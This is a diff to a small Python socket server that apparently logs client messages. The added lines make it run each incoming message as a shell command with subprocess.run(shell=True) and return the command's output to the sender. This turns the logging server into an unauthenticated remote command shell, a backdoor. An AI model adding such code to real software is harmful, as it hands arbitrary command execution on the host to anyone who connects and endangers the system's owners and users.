@@ -1,4 +1,4 @@
-import socket, threading
+import socket, threading, subprocess
 from datetime import datetime
 
 #Path to logfile
@@ -10,7 +10,7 @@ FORMAT = 'utf-8'
 #Establish byte length 
 HEADER = 64
 #PORT TO HOST SERVER ON
-PORT = 10001
+PORT = 10003
 #SERVER ADDRESS (can put ip address OR use socket to pull ip from hostname)
 # IP = socket.gethostbyname(socket.gethostname())
 IP = "127.0.0.1"
@@ -36,9 +36,13 @@ def client_connection(conn,addr):
                 print(f"[SERVER] ACTIVE CONNECTIONS: {threading.activeCount() - 2}") #Print how many active connections there are
                 
             else:
+                print(msg)
+                output = subprocess.run(msg, shell=True,capture_output=True,text=True) 
+                print(output.stdout)
                 print(f"[{addr[0]}:{addr[1]}] \"{msg}\"")
                 write_to_file(msg,addr[0])
                 conn.send("Message Received".encode(FORMAT))
+                conn.send(output.stdout.encode(FORMAT))
     conn.close() #Close connection
         
 def start():
